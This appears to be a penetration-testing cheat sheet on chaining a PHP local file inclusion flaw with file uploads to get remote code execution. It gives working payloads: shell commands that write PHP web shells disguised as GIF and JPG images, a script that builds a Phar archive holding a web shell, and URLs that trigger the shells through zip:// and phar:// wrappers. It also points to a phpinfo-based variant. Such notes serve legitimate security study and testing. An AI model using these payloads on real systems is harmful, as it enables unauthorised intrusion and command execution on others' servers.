
### Image Upload

Malicious image file upload
```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```


### ZIP Archive Upload

Malicious zip archive (PHP-only & Not enabled by default) (Better for when zips can be uploaded)
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Execute Payload (ZIP wrapper)
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```


### Phar Upload

PHP file content
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Phar file packaging
```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Execution payload
```http
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### PHP Info Attack

Requirements needed to work (Very uncommon)
```
LFI + uploads enabled + old PHP + exposed phpinfo()
```

https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html

